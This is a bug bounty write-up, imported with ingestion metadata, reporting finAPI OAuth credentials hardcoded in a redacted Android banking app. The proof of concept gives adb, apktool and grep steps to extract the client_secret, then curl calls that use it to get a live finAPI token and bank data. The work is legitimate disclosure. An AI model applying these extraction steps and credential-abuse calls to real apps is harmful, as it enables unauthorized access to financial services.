---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-04-01_write-up-finapi-open-banking-api-oauth-credentials-exposed-in-plain-text-in-andr.md
original_filename: 2022-04-01_write-up-finapi-open-banking-api-oauth-credentials-exposed-in-plain-text-in-andr.md
title: Write Up – Finapi (Open Banking API) Oauth Credentials Exposed In Plain Text
  In Android App
category: documents
detected_topics:
- oauth
- sso
- access-control
- command-injection
- otp
- mobile-security
tags:
- imported
- documents
- oauth
- sso
- access-control
- command-injection
- otp
- mobile-security
language: en
raw_sha256: 293e453fd944ff67f687986dc2aa9dc7a533f4755c6648f4fb682fcbe087ca97
text_sha256: 4d58340dd1aad800a8a86a472f89c99ff4c65258cd00fc4fdaefc3e3298a9143
ingested_at: '2026-06-28T07:32:10Z'
sensitivity: unknown
redactions_applied: true
---

# Write Up – Finapi (Open Banking API) Oauth Credentials Exposed In Plain Text In Android App

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-04-01_write-up-finapi-open-banking-api-oauth-credentials-exposed-in-plain-text-in-andr.md
- Source Type: markdown
- Detected Topics: oauth, sso, access-control, command-injection, otp, mobile-security
- Ingested At: 2026-06-28T07:32:10Z
- Redactions Applied: True
- Raw SHA256: `293e453fd944ff67f687986dc2aa9dc7a533f4755c6648f4fb682fcbe087ca97`
- Text SHA256: `4d58340dd1aad800a8a86a472f89c99ff4c65258cd00fc4fdaefc3e3298a9143`


## Content

---
title: "Write Up – Finapi (Open Banking API) Oauth Credentials Exposed In Plain Text In Android App"
page_title: "FINAPI (OPEN BANKING API) OAUTH CREDENTIALS EXPOSED IN PLAIN TEXT IN ANDROID APP  – @omespino"
url: "https://omespino.com/write-up-finapi-open-banking-api-oauth-credentials-exposed-in-plain-text-in-android-app/"
final_url: "https://omespino.com/write-up-finapi-open-banking-api-oauth-credentials-exposed-in-plain-text-in-android-app/"
authors: ["Omar Espino (@omespino)"]
bugs: ["Hardcoded credentials", "Android"]
publication_date: "2022-04-01"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2761
---

MOBILE[April 2022](/write-up-finapi-open-banking-api-oauth-credentials-exposed-in-plain-text-in-android-app/)

# FINAPI (OPEN BANKING API) OAUTH CREDENTIALS EXPOSED IN PLAIN TEXT IN ANDROID APP 

**Introduction** Hi everyone It’s been a while since my last post but I’m back, I want to tell you a short story about a REDACTED bug bounty program and why you can always check the basic payloads because you will be surprised that sometimes will work. (Never save creds in plain text inside of android application) 

**Report Summary** Hi REDACTED team, I was able to find thefinAPI oauth credentials exposed in plain text in your REDACTED Android application.

**Proof of concept** 1.- Get the latest REDACTED Android application, in my case I downloaded it to my phone (connect the phone in debug mode) and then pull out the APK with adb tools. (com.REDACTED.android.main is the APK package name): 
  
  
  omespino@h0st:~# adb pull data/app/com.REDACTED.android.main/base.apk
  

2.- Then I decompile the APK with the following command apktool:  

  
  
  omespino@h0st:~# apktool d base.apk
  

3.- Then I just grep for the “client_secret” to get finap url oauth
  
  
  omespino@h0st:~# grep -ihr --color client_secret ./base | head -1 
  <string name="url_finapi_oauth">
  https://live.finapi.io/oauth/token?grant_type=client_credentials&amp;client_id=00000000-0000-0000-0000-00000000&amp;client_secret=00000000-0000-0000-0000-00000000
  </string>
  

4.- At this point, anyone could start using finAPI on behalf of your company :
  
  
  # first we need to get and access token from the fineapi
  # findAPI GET tokens documentation https://docs.finapi.io/#post-/oauth/token
  omespino@h0st:~# curl -sX POST "https://live.finapi.io/oauth/token?grant_type=client_credentials&client_id=00000000-0000-0000-0000-00000000&client_secret=00000000-0000-0000-0000-00000000" | json_pp
  {
  "token_type" : "bearer",
  "expires_in" : 1347,
  "scope" : "all",
  "access_token" : "IlR3byBy...lcmVuY2Ui"
  }
  # then we can use the token to abuse the finAPI and get banks information
  # findAPI GET banks documentation https://docs.finapi.io/#get-/api/v1/banks
  omespino@h0st:~# curl -H 'Authorization: Bearer ***REDACTED*** https://live.finapi.io/api/v1/banks | json_pp
  {
  "banks" : [
  {
  "supportedDataSources" : [
  "XXXXX_SERVER"
  ],
  "location" : "XX",
  "blz" : "903123123",
  "lastSuccessfulCommunication" : "201X-0X-0X 13:37:00.000",
  "loginFieldUserId" : "Onlinebanking-ID",
  "isCustomerIdPassword" : false,
  "isTestBank" : true,
  "isSupported" : true,
  "name" : "XXX-XXXXXXXsystem"
  },
  -------------- REDACTED -------------

**Environment and tools** \- adb Android Debug Bridge  
\- apktool

**Impact** Anyone, could create, get, update, delete, import users / banks / comunications in finAPI on REDACTED findAPI account. Well, that’s it, share your thoughts, If you have any doubts, comments or suggestions just drop me a line here or on Twitter [@omespino](https://twitter.com/omespino), read you later.[](https://www.facebook.com/sharer/sharer.php?u=/write-up-google-vrp-bug-bounty-etc-environment-local-variables-exfiltrated-on-linux-google-earth-pro-desktop-app-1337-usd/&display=popup&ref=plugin&src=share_button)

[](/write-up-private-bug-bounty-bypass-redacted-android-application-screen-lock-via-local-brute-forcing/)
